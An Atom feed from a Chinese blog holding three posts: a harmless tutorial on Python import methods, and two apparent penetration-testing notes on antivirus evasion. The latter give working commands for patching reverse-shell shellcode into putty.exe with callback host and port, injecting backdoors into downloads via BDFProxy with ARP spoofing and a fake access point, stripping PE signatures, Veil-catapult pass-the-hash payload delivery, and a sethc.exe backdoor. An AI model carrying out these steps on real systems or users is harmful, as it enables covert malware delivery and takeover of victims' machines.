<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat++</title>
  
  <subtitle>看见我的猫粮吗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c.cat.plus/"/>
  <updated>2020-05-14T15:12:54.169Z</updated>
  <id>http://c.cat.plus/</id>
  
  <author>
    <name>Cat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python花式导包的几种方法</title>
    <link href="http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2018-03-14T17:01:00.000Z</published>
    <updated>2020-05-14T15:12:54.169Z</updated>
    
    <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天跟大家分享 8 种导入模块的方法。&lt;/p&gt;
&lt;p&gt;直接 import&lt;br&gt;人尽皆知的方法，直接导入即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Backdoor-factory后门工厂免杀工具及bdfproxy</title>
    <link href="http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</id>
    <published>2016-08-08T13:35:16.000Z</published>
    <updated>2020-06-12T09:34:47.123Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Backdoor-Factory"><a href="#Backdoor-Factory" class="headerlink" title="Backdoor-Factory"></a><strong>Backdoor-Factory</strong></h3></blockquote><p><strong>Patch</strong></p><ul><li>通过替换EXE,DLL,注册表等方法修复系统漏洞或问题的方法</li><li>BdF:向二进制文件中增加或者删除代码内容<br>  某些受保护的二进制程序无法patch<br>  存在一定概率文件会被patch坏掉</li></ul><p><strong>后门工厂</strong></p><ul><li><p>适用于windows PE x32/x64 和 Linux ELF x32/x64 (OSX)</p></li><li><p>支持MSF payload,自定义payload</p></li><li><p>将shellcode代码patch进模板文件,躲避AV检查</p></li><li><p>Python语言编写</p></li></ul><p><strong>MsF使用的patch方法</strong></p><ul><li><p>覆盖程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp...</code></p></li><li><p>创建新的线程执行shellcode并跳回原程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp -k</code><br>  增加代码片段跳转执行后跳回源程序入口</p></li></ul><p><strong>CTP 方法</strong></p><ul><li>增加新的代码段 section, 与MSF的 <code>-k</code> 方法类似</li><li>使用现有的代码裂缝/洞(code cave)存放 shellcode</li></ul><p><strong>代码洞</strong></p><ul><li>二进制文件中超过两个字节的连续 <code>x00</code> 区域(代码片段间区域)</li><li>根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同</li></ul><pre><code>cp `which cat` .lshexeditor cat</code></pre><ul><li>单个代码洞大小不足以存放完整的shellcode<br>多代码洞跳转(非顺序执行)<br>初期免杀率可达100%<br>结合MsF的stager方法</li></ul><p><strong>Patch选项</strong></p><ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码洞注入</li></ul><h4 id="BdF基本使用"><a href="#BdF基本使用" class="headerlink" title="BdF基本使用"></a><strong>BdF基本使用</strong></h4><p><strong>检查二进制文件是否支持代码注入</strong></p><pre><code>backdoor-factory -f putty.exe –S</code></pre><p><strong>显示可用payload</strong></p><pre><code>backdoor-factory -f putty.exe -s showiat_reverse_tcp_stager_threaded</code></pre><p><strong>查看code cave大小</strong></p><pre><code>backdoor-factory -f putty.exe -c -l 100        #查看100字节的cave大小有多少</code></pre><ul><li>IAT—-import address table<br>指针指向WinAPI地址,被称为thunks(形实转换程序),地址预定义    </li></ul><h5 id="免杀效果对比"><a href="#免杀效果对比" class="headerlink" title="免杀效果对比"></a><strong>免杀效果对比</strong></h5><pre><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666        #单代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J        #多代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666 -a     #新加一个代码片段注入</code></pre><p><strong>与 veil-evasion 集成</strong></p><ul><li>最新版veil默认已经没有backdoor-factory模块.</li></ul><h4 id="BdFproxy"><a href="#BdFproxy" class="headerlink" title="BdFproxy"></a><strong>BdFproxy</strong></h4><p><strong>BdFproxy</strong> (mitmproxy)</p><ul><li>基于流量劫持动态注入shellcode(ARP spoof, DNS spoof, Fake AP)</li></ul><p><strong>步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1#打开路由IP转发功能</span><br><span class="line"></span><br><span class="line">#添加防火墙规则,把访问目标80&#x2F;443端口的流量重定向到8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80&#x2F;443 -j REDIRECT --toports 8080</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent#默认代理模式regular,修改为transparent透明代理</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 1.1.1.2 1.1.1.1#执行ARP欺骗一个目标</span><br></pre></td></tr></table></figure><ul><li><p>启动MsF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfdb init#初始化msf数据库</span><br><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_rescurce.rc</span><br></pre></td></tr></table></figure></li><li><p>Mana 创建 Fack AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mana</span><br><span class="line">vi &#x2F;etc&#x2F;mana-toolkit&#x2F;hostapd-mana.conf</span><br><span class="line">#修改无线SSID名称</span><br><span class="line"></span><br><span class="line">.&#x2F;usr&#x2F;share&#x2F;mana-toolkit&#x2F;run-mana&#x2F;start-nat-simple.sh</span><br><span class="line">修改wlan0无线网卡适配器并启动</span><br><span class="line">iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80&#x2F;443 -j REDIRECT --to-port 8080</span><br><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li><li><p>BdFproxy 代理注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">bdfproxy</span><br></pre></td></tr></table></figure></li><li><p>MsF侦听反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure></li></ul><p><strong>补充内容</strong></p><ul><li>全站HTTPS防注入(微软每个补丁都带马)</li><li>PE文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<br>  全部用 0 覆盖<br>  BDF默认清除数字签名</li><li><code>https://live.sysinternals.com</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Backdoor-Factory&quot;&gt;&lt;a href=&quot;#Backdoor-Factory&quot; class=&quot;headerlink&quot; title=&quot;Backdoor-Factory&quot;&gt;&lt;/a&gt;&lt;strong&gt;Backdoor-Factory&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
  </entry>
  
  <entry>
    <title>Veil-catapult注入进程内存执行及shellter免杀</title>
    <link href="http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/"/>
    <id>http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/</id>
    <published>2016-08-06T15:15:06.000Z</published>
    <updated>2020-06-11T10:55:13.768Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a><strong>Veil-catapult</strong></h3></blockquote><ul><li>也属于 Veil-Framework框架的一部分</li></ul><p><strong>Payload的投递</strong></p><ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用 impacket 上传二进制 payload 文件</li><li>使用 <code>passing-the-hash</code> 触发执行 payload</li></ul><p><strong>Payload直接在内存中运行</strong></p><ul><li>payload不写入硬盘，避免文件型病毒查杀</li></ul><p><strong>Powershell Injector</strong></p><ul><li>适用于windows7及以上系统版本</li></ul><pre><code>veil-catapult         #启动veil-catapult#根据提示进行参数设置#先传了个powershell#然后传了个msf的payload#再用shell调用payload#最后反弹shell</code></pre><p><strong>Barebones Python Injector</strong></p><ul><li>适用于powershell injector 失败的情况下使用</li></ul><p><strong>Sethc backdoor</strong></p><ul><li>用 cmd.exe 替换 C:\Windows\System32\sethc.exe</li></ul><p><strong>Execute custom command</strong></p><ul><li>执行自定义命令</li></ul><p><strong>EXE delivery</strong></p><pre><code>/etc/veil/settings.py</code></pre><h4 id="另一种免杀思路"><a href="#另一种免杀思路" class="headerlink" title="另一种免杀思路"></a><strong>另一种免杀思路</strong></h4><p><strong>传统防病毒查杀原理</strong></p><ul><li>查找文件体特殊字符串,匹配则查杀</li><li>找到触发AV查杀的精确字符串,并将其修改</li></ul><ul><li>将执行程序分片成很多小片段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤,最终精确定位</li></ul><p><strong>二进制文件切片工具</strong> </p><p><code>Evade</code> , <code>Dsplit</code></p><p><strong>16进制文件编辑工具</strong></p><p><code>Hexeditor</code>    , <code>ghex</code>    #ghex是图形化界面</p><pre><code>apt-get install ghex        #kali安装ghex</code></pre><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a><strong>shellter</strong></h4><ul><li>代码混淆</li><li>定制的编码方式</li><li>多态编码</li><li>集成部分 MSF payload</li><li>目前只支持32位PE程序</li><li>使用正常的EXE文件作为模板,将payload代码加入到模板内<br>模板程序的功能将失效</li></ul><p><strong>kali安装shellter</strong></p><pre><code>apt-get install shellter    #安装使用shellter                    #按照提示使用</code></pre>]]></content>
    
    <summary type="html">
    
      
